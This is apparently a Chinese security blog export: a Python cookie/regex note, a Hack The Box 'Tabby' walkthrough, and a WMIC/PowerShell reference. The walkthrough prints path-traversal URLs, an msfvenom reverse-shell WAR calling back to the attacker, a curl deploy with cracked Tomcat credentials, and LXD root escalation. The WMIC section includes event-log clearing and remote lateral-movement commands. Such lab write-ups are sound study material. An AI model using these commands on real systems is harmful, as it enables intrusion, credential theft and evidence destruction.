<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'https://www.bilibili.com/'</span></span><br><span class="line"><span class="comment">#创建session会话</span></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="comment">#发起请求</span></span><br><span class="line">logpage = session.get(url)</span><br><span class="line">print(type(session.cookies))</span><br><span class="line"><span class="comment">#&lt;class 'requests.cookies.RequestsCookieJar'&gt;</span></span><br><span class="line"><span class="comment">#使用utils.dict_from_cookiejar方法使得requests.cookies.RequestsCookieJar转为dictionary</span></span><br><span class="line">print(type(requests.utils.dict_from_cookiejar(session.cookies)))</span><br><span class="line"><span class="comment">#&lt;class 'dict'&gt;</span></span><br><span class="line"><span class="comment">#使用json.dumps()使得dictionary转为string</span></span><br><span class="line">print(type(json.dumps(requests.utils.dict_from_cookiejar(session.cookies))))</span><br><span class="line"><span class="comment">#&lt;class 'str'&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'https://www.bilibili.com/'</span></span><br><span class="line"><span class="comment">#创建session会话</span></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="comment">#发起请求</span></span><br><span class="line">logpage = session.get(url)</span><br><span class="line"><span class="comment">#print(session.cookies)</span></span><br><span class="line"><span class="comment">#print(session.headers)</span></span><br><span class="line">print(requests.utils.dict_from_cookiejar(session.cookies))</span><br><span class="line">cookie = requests.utils.dict_from_cookiejar(session.cookies)</span><br><span class="line"><span class="comment">#获取cookie</span></span><br><span class="line">print(cookie[<span class="string">'main_confirmation'</span>])</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.jianshu.com/p/8c3f63c63c57" target="_blank" rel="noopener">参考链接</a></p>
</blockquote>
<h1 id="re库"><a href="#re库" class="headerlink" title="re库"></a>re库</h1><h2 id="使用post时如何不让页面跳转"><a href="#使用post时如何不让页面跳转" class="headerlink" title="使用post时如何不让页面跳转"></a>使用post时如何不让页面跳转</h2><p>添加参数 <strong>allow_redirects=False</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = requests.post(url=url,headers=headers,data=data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">## 如何匹配页面某一元素</span></span><br><span class="line"></span><br><span class="line"> - 定位页面元素的三种方法</span><br><span class="line">[定位页面元素的三种方法](https://blog.csdn.net/rankun1/article/details/81357179?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-81357179.nonecase&amp;utm_term=python%E6%8A%93%E5%8F%96%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0)</span><br><span class="line"> - 使用re.search()进行匹配定位</span><br><span class="line"> 语法规则：re.search(pattern, string, flags=<span class="number">0</span>)</span><br><span class="line">```python</span><br><span class="line">content= <span class="string">'&lt;input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="d98f55cd54276c4b07c6adac29a303e2e7e6389c"&gt;'</span></span><br><span class="line">res = re.search(<span class="string">'input.*?id="jstokenCSRF".*?value="(.*?)"'</span>,content)</span><br><span class="line">print(res.group())</span><br><span class="line"><span class="comment"># id="jstokenCSRF" name="tokenCSRF" value="d98f55cd54276c4b07c6adac29a303e2e7e6389c"</span></span><br><span class="line">print(res.group(<span class="number">1</span>))</span><br><span class="line"><span class="comment">#d98f55cd54276c4b07c6adac29a303e2e7e6389c</span></span><br></pre></td></tr></table></figure>
<p>通过正则规则 <strong>.*?</strong>匹配了input和id=”jstokenCSRF”之间的字符获得input type=”hidden” id=”jstokenCSRF”<br>通过（）进行分组把并用（.*?）进行组内匹配<br>再通过res.group(1)获得所需的值，其中gruop(1)对应匹配模式中的（），从1开始，有n个（）就有gourp(n)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content= <span class="string">'id="jstokenCSRF" name="tokenCSRF" value="d98f55cd54276c4b07c6adac29a303e2e7e6389c" age="18"&gt;'</span></span><br><span class="line">res = re.search(<span class="string">'id="jstokenCSRF".*?value="(.*?)".*?age="(.*?)"'</span>,content)</span><br><span class="line">print(<span class="string">'value=&#123;0&#125;\tage=&#123;1&#125;'</span>.format(res.group(<span class="number">1</span>),res.group(<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#value=d98f55cd54276c4b07c6adac29a303e2e7e6389c	age=18</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://blog.csdn.net/sirow/article/details/89447288" target="_blank" rel="noopener">参考链接</a><br><a href="https://www.runoob.com/regexp/regexp-syntax.html" target="_blank" rel="noopener">正则语法</a><br><a href="https://tool.oschina.net/regex/" target="_blank" rel="noopener">正则验证工具</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>HTB-tabby</title>
    <url>/2020/08/24/HTB-tabby/</url>
    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -T5 10.10.10.194 -oN nmap.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200823210641296.png#pic_center" alt="在这里插入图片描述"></p>
<h1 id="站点文件包含"><a href="#站点文件包含" class="headerlink" title="站点文件包含"></a>站点文件包含</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加主机解析</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"10.10.10.194 megahosting.htb"</span>&gt;&gt;/etc/hosts</span><br></pre></td></tr></table></figure>
<p>发现存在文件包含漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://megahosting.htb/news.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200823210856625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>对10.10.10.194:8080进行wfuzz</p>
<p><img src="https://img-blog.csdnimg.cn/20200823212242638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>XXX/tomcat-users.xml的文件会存在 账户密码<br><img src="https://img-blog.csdnimg.cn/20200823212300662.png#pic_center" alt="在这里插入图片描述"><br>故</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -u  <span class="string">"http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml"</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hh 0</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200823212517765.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200823212529785.png#pic_center" alt="在这里插入图片描述"><br>由tomcat-users.xmltomcat文件可知tomcat只有admin-gui,manager-script两个角色<br>没有manager-gui角色<br>故无法登陆<a href="http://10.10.10.194/manager/html" target="_blank" rel="noopener">http://10.10.10.194/manager/html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manager-gui — Access to the HTML interface.</span><br><span class="line">manager-status — Access to the <span class="string">"Server Status"</span> page only.</span><br><span class="line">manager-script — Access to the tools-friendly plain text interface that is described <span class="keyword">in</span> this document, and to the <span class="string">"Server Status"</span> page.</span><br><span class="line">manager-jmx — Access to JMX proxy interface and to the <span class="string">"Server Status"</span> page.</span><br><span class="line"></span><br><span class="line">admin-gui - use this role <span class="keyword">for</span> the graphical web interface.</span><br><span class="line">admin-script - use this role <span class="keyword">for</span> the scripting web interface.</span><br></pre></td></tr></table></figure>
<p>使用<a href="https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/" target="_blank" rel="noopener">host-manager</a>添加虚拟主机失败 [但是tomcat又存在admin-gui角色，或许可以部署成功….]</p>
<p>发现存在manager-script角色，可使用<a href="https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script" target="_blank" rel="noopener">curl命令上传文件</a>部署shell</p>
<ul>
<li>为什么部署在<a href="http://localhost:8080/manager/text/deploy?path=下？" target="_blank" rel="noopener">http://localhost:8080/manager/text/deploy?path=下？</a><br>由官方文档可知 <img src="https://img-blog.csdnimg.cn/20200824112834828.png#pic_center" alt="在这里插入图片描述"><h2 id="shell生成"><a href="#shell生成" class="headerlink" title="shell生成"></a>shell生成</h2></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#msfvenom -l payloads |grep reverse_tcp #查看某一payload</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.51 lport=4444 -f war &gt; get.war</span><br></pre></td></tr></table></figure>
<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -f -T get.war -u <span class="string">'tomcat:$3cureP4s5w0rd123!'</span> <span class="string">"http://10.10.10.194:8080/manager/text/deploy?path=/get.war"</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#查看shell上传是否成功</span></span><br><span class="line">http://10.10.10.194:8080/manager/text/list</span><br></pre></td></tr></table></figure>
<h2 id="侦听4444端口，获得shell"><a href="#侦听4444端口，获得shell" class="headerlink" title="侦听4444端口，获得shell"></a>侦听4444端口，获得shell</h2><p><img src="https://img-blog.csdnimg.cn/20200824114726279.png#pic_center" alt="在这里插入图片描述"></p>
<h1 id="文件爆破"><a href="#文件爆破" class="headerlink" title="文件爆破"></a>文件爆破</h1><p><img src="https://img-blog.csdnimg.cn/20200824115913845.png#pic_center" alt="在这里插入图片描述"><br>文件下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.194/files/16162020_backup.zip</span><br></pre></td></tr></table></figure>
<p>文件爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip</span><br></pre></td></tr></table></figure>
<p>获得ash密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat@tabby:/home$ su ash</span><br><span class="line">su ash</span><br><span class="line">Password: admin@it</span><br><span class="line">ash@tabby:/home$ whoami</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>脚本枚举</p>
<h2 id="LXD提权"><a href="#LXD提权" class="headerlink" title="LXD提权"></a>LXD提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机</span></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line"><span class="comment">#目标机</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz</span><br><span class="line"><span class="comment">#创建容器，并指定别名 myimage</span></span><br><span class="line">lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --<span class="built_in">alias</span> myimage</span><br><span class="line">lxc image list</span><br><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"><span class="comment">#挂载 /mnt/root </span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"><span class="built_in">cd</span> /mnt/root/root</span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/articles/system/216803.html" target="_blank" rel="noopener">参考链接</a></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
<li>若存在admin-script角色，使用命令部署</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Example command:</span></span><br><span class="line">curl -u <span class="built_in">test</span>:<span class="built_in">test</span> http://localhost:8080/host-manager/text/add?name=www.awesomeserver.com&amp;aliases=awesomeserver.com&amp;appBase/mnt/appDir&amp;deployOnStartup=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>多阅读官方文档</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Windows--Wmic_Get-CimInstance</title>
    <url>/2020/08/21/Windows--Wmic_Get-CimInstance/</url>
    <content><![CDATA[<h1 id="什么是WMIC"><a href="#什么是WMIC" class="headerlink" title="什么是WMIC"></a>什么是WMIC</h1><p>WMI的全名为“Windows Management Instrumentation”。从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。</p>
<h1 id="常规用法"><a href="#常规用法" class="headerlink" title="常规用法"></a>常规用法</h1><h2 id="进程与服务"><a href="#进程与服务" class="headerlink" title="进程与服务"></a>进程与服务</h2><ul>
<li><p>获取系统进程信息<br>【brief摘要信息，full全部信息】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic process list brief/full</span><br><span class="line"><span class="comment">#获取指定信息</span></span><br><span class="line">wmic process get [属性]</span><br><span class="line"><span class="comment">#wmic process get processid,name,executablepath</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建/删除 进程</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic process call  create/delete “[Process Name]”</span><br><span class="line"><span class="comment">#e.g</span></span><br><span class="line"><span class="comment">#wmic process call create calc (创建计算机进程，打开计算器)</span></span><br><span class="line">wmic process call create <span class="string">"FilePath"</span></span><br><span class="line"><span class="comment">#wmic process call create "C:\windows\system32\cmd.exe "(打开某一个路径的程序，杀软拦截的比较狠)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>终止进程</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic process <span class="built_in">where</span> name=”explorer.exe” call terminate</span><br></pre></td></tr></table></figure>
<ul>
<li>查詢服务信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br><span class="line"><span class="comment">#查看运行中的服务</span></span><br><span class="line">wmic service <span class="built_in">where</span> <span class="string">"state='running'"</span> list brief</span><br></pre></td></tr></table></figure>
<ul>
<li>开启/关闭服务</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开去服务</span></span><br><span class="line">wmic service <span class="built_in">where</span> <span class="string">"name='【SERVERNAME】'"</span> call startservice</span><br><span class="line"><span class="comment">#关闭服务</span></span><br><span class="line">wmic service <span class="built_in">where</span> <span class="string">"name='【SERVERNAME】'"</span> call stopservice</span><br></pre></td></tr></table></figure>

<h2 id="系统应用程序"><a href="#系统应用程序" class="headerlink" title="系统应用程序"></a>系统应用程序</h2><ul>
<li>查看安装的软件信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><ul>
<li>获取可执行文件列表</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic process <span class="built_in">where</span> <span class="string">"NOT ExecutablePath LIKE '%Windows%'"</span> GET ExecutablePath</span><br></pre></td></tr></table></figure>

<ul>
<li>获取目录属性</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> wmic fsdir <span class="built_in">where</span> <span class="string">"drive='【盘符】:' and filename='【目录名】'"</span> get /format:list</span><br><span class="line"><span class="comment">#wmic fsdir where "drive='f:' and filename='kk'" get /format:list</span></span><br></pre></td></tr></table></figure>

<ul>
<li>删除目录<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic fsdir <span class="built_in">where</span> <span class="string">"[盘符]:\\[目录名]"</span> call delete</span><br><span class="line"><span class="comment">#使用双斜杆转义</span></span><br><span class="line"><span class="comment">#wmic fsdir where "f:\\test" call delete</span></span><br></pre></td></tr></table></figure>
<h2 id="用户账号管理"><a href="#用户账号管理" class="headerlink" title="用户账号管理"></a>用户账号管理</h2></li>
<li>用户信息获取</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic useraccount</span><br><span class="line">wmic useraccount list brief</span><br></pre></td></tr></table></figure>

<ul>
<li>用户账号重命名<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic useraccount <span class="built_in">where</span> <span class="string">"name='%UserName%'"</span> call rename newUserName   // 更改当前用户名</span><br><span class="line">wmic useraccount <span class="built_in">where</span> <span class="string">"name='Administrator'"</span> call Rename admin  // 更改指定用户名</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2></li>
<li>以文件的形式输出获取的内容</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic /output:d:\install.txt product get name,version</span><br></pre></td></tr></table></figure>

<h1 id="WMIC之信息收集"><a href="#WMIC之信息收集" class="headerlink" title="WMIC之信息收集"></a>WMIC之信息收集</h1><h2 id="获取系统角色、用户名和制造商"><a href="#获取系统角色、用户名和制造商" class="headerlink" title="获取系统角色、用户名和制造商"></a>获取系统角色、用户名和制造商</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles/format:list</span><br></pre></td></tr></table></figure>
<h2 id="获取操作系统详情"><a href="#获取操作系统详情" class="headerlink" title="获取操作系统详情"></a>获取操作系统详情</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic os get /all /format:list</span><br></pre></td></tr></table></figure>
<h2 id="获取补丁信息"><a href="#获取补丁信息" class="headerlink" title="获取补丁信息"></a>获取补丁信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<h2 id="获取SID"><a href="#获取SID" class="headerlink" title="获取SID"></a>获取SID</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic group get Caption,InstallDate,LocalAccount,Domain,SID,Status</span><br></pre></td></tr></table></figure>
<h2 id="获取已安装的应用程序列表"><a href="#获取已安装的应用程序列表" class="headerlink" title="获取已安装的应用程序列表"></a>获取已安装的应用程序列表</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
<h2 id="获取正在运行的服务列表"><a href="#获取正在运行的服务列表" class="headerlink" title="获取正在运行的服务列表"></a>获取正在运行的服务列表</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic service <span class="built_in">where</span> <span class="string">"state='running'"</span> list brief</span><br></pre></td></tr></table></figure>
<h2 id="获取反病毒产品详情"><a href="#获取反病毒产品详情" class="headerlink" title="获取反病毒产品详情"></a>获取反病毒产品详情</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br></pre></td></tr></table></figure>

<h2 id="判断目标系统是否为虚拟机"><a href="#判断目标系统是否为虚拟机" class="headerlink" title="判断目标系统是否为虚拟机"></a>判断目标系统是否为虚拟机</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic onboarddevice get Desciption,DeviceType,Enabled,Status /format:list</span><br></pre></td></tr></table></figure>
<h2 id="清理系统日志"><a href="#清理系统日志" class="headerlink" title="清理系统日志"></a>清理系统日志</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic nteventlog list brief</span><br><span class="line">wmic nteventlog <span class="built_in">where</span>  logfileName=’system’ call cleareventlog</span><br></pre></td></tr></table></figure>

<h1 id="WMIC之内网横移"><a href="#WMIC之内网横移" class="headerlink" title="WMIC之内网横移"></a>WMIC之内网横移</h1><h2 id="手动横移"><a href="#手动横移" class="headerlink" title="手动横移"></a>手动横移</h2><p><strong>由于wmic执行远程命令没有回显，所以要将结果写入到txt中</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic /node:[TargetIp] /user:[UserName] /password:[Password] process call create <span class="string">"cmd.exe /c ipconfig &gt; c:\result.txt"</span></span><br><span class="line"><span class="comment"># /node：指定将对其进行操作的服务器</span></span><br><span class="line"><span class="built_in">type</span> result.txt</span><br></pre></td></tr></table></figure>
<h2 id="脚本横移"><a href="#脚本横移" class="headerlink" title="脚本横移"></a>脚本横移</h2><p><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec</a></p>
<blockquote>
<p><a href="https://www.freebuf.com/articles/network/246440.html" target="_blank" rel="noopener">参考链接</a><br><a href="https://www.freebuf.com/articles/system/182531.html" target="_blank" rel="noopener">参考链接</a></p>
</blockquote>
<h1 id="Get-CimInstance"><a href="#Get-CimInstance" class="headerlink" title="Get-CimInstance"></a>Get-CimInstance</h1><p>Get-CimInstance–wmic的替代品<br>配合<a href="https://github.com/vinaypamnani/wmie2/releases" target="_blank" rel="noopener">WmiExplorer</a>使用</p>
<h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><h2 id="获取WMI类"><a href="#获取WMI类" class="headerlink" title="获取WMI类"></a>获取WMI类</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Get-CimClass -Namespace root/CIMV2 |</span><br><span class="line">  Where-Object CimClassName -like Win32* |</span><br><span class="line">    Select-Object CimClassName</span><br></pre></td></tr></table></figure>
<h1 id="常规用法-1"><a href="#常规用法-1" class="headerlink" title="常规用法"></a>常规用法</h1><h2 id="进程与服务-1"><a href="#进程与服务-1" class="headerlink" title="进程与服务"></a>进程与服务</h2><ul>
<li>获取系统进程信息<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Process|<span class="built_in">format-table</span> processid,name,executablepath |<span class="built_in">Select-Object</span> <span class="literal">-First</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-Namespace 			指定命名空间</span></span><br><span class="line"><span class="comment">#-Class 				指定类名</span></span><br><span class="line"><span class="comment">#format-table/list		格式化输出</span></span><br><span class="line"><span class="comment">#Select-Object -First 	选取前十行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#筛选某一进程</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Process <span class="literal">-Filter</span> <span class="string">"name = 'qq.exe'"</span>|<span class="built_in">format-table</span> processid,name,executablepath</span><br></pre></td></tr></table></figure></li>
<li>创建/删除 进程</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除进程</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Process <span class="literal">-Filter</span> <span class="string">"name = 'qq.exe'"</span> |<span class="built_in">Invoke-CimMethod</span> <span class="literal">-Name</span> Terminate </span><br><span class="line">[| <span class="built_in">Out-NULL</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>查詢服务信息</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Service </span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Service <span class="literal">-Filter</span> <span class="string">"State='Running'"</span></span><br></pre></td></tr></table></figure>
<ul>
<li>开启/关闭服务</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启打印后台处理程序</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Service <span class="literal">-Filter</span> <span class="string">"name='spooler'"</span>|<span class="built_in">Invoke-CimMethod</span> <span class="literal">-Name</span> startservice</span><br><span class="line"><span class="comment">#关闭打印后台处理程序</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Service <span class="literal">-Filter</span> <span class="string">"name='spooler'"</span>|<span class="built_in">Invoke-CimMethod</span> <span class="literal">-Name</span> stopservice</span><br></pre></td></tr></table></figure>
<h2 id="系统应用程序-1"><a href="#系统应用程序-1" class="headerlink" title="系统应用程序"></a>系统应用程序</h2><ul>
<li>查看安装的软件信息</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Product |<span class="built_in">format-table</span>[<span class="built_in">Select-Object</span>] name,version |<span class="built_in">Select-Object</span> <span class="literal">-First</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h2 id="文件管理-1"><a href="#文件管理-1" class="headerlink" title="文件管理"></a>文件管理</h2><ul>
<li>获取可执行文件列表</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Process <span class="literal">-Filter</span> <span class="string">"NOT ExecutablePath LIKE '%Windows%'"</span>|<span class="built_in">format-table</span> ExecutablePath</span><br></pre></td></tr></table></figure>
<ul>
<li>获取目录属性</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> win32_directory <span class="literal">-filter</span> <span class="string">"drive='f:' and filename='kk'"</span> |<span class="built_in">select-object</span> <span class="literal">-first</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>删除目录</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> win32_directory <span class="literal">-filter</span><span class="string">"drive='f:' and filename='test'"</span> |<span class="built_in">Invoke-CimMethod</span> <span class="literal">-Name</span> delete</span><br></pre></td></tr></table></figure>
<h2 id="用户账号管理-1"><a href="#用户账号管理-1" class="headerlink" title="用户账号管理"></a>用户账号管理</h2><ul>
<li>用户信息获取<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> win32_useraccount</span><br></pre></td></tr></table></figure></li>
<li>用户账号重命名</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> win32_useraccount<span class="literal">-filter</span>  <span class="string">"name='%UserName%'"</span> |<span class="built_in">Invoke-CimMethod</span> <span class="literal">-Name</span> rename(<span class="string">"newUserName "</span>)</span><br></pre></td></tr></table></figure>

<h1 id="GIM之信息收集"><a href="#GIM之信息收集" class="headerlink" title="GIM之信息收集"></a>GIM之信息收集</h1><h2 id="获取系统角色、用户名和制造商-1"><a href="#获取系统角色、用户名和制造商-1" class="headerlink" title="获取系统角色、用户名和制造商"></a>获取系统角色、用户名和制造商</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> win32_computersystem |<span class="built_in">select-object</span> Name,Domain,Manufacturer,Model,Username,Roles</span><br></pre></td></tr></table></figure>
<h2 id="获取补丁信息-1"><a href="#获取补丁信息-1" class="headerlink" title="获取补丁信息"></a>获取补丁信息</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_QuickFixEngineering |<span class="built_in">select-object</span> Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
<h2 id="获取SID-1"><a href="#获取SID-1" class="headerlink" title="获取SID"></a>获取SID</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Group |<span class="built_in">format-table</span> caption,InstallDate,LocalAccount,Domain,SID,Status</span><br></pre></td></tr></table></figure>
